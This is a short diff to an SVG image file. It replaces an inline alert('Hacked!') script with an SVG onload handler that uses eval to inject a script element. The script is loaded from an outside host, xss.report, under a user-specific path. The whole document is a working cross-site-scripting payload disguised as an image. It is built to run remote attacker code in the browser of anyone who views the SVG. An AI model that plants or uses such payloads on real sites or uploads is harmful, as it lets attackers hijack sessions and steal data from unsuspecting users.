@@ -1,5 +1,1 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script type="text/javascript">
-    alert('Hacked!');
-  </script>
-</svg>
+<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/manoj665\';document.body.appendChild(a)')" />
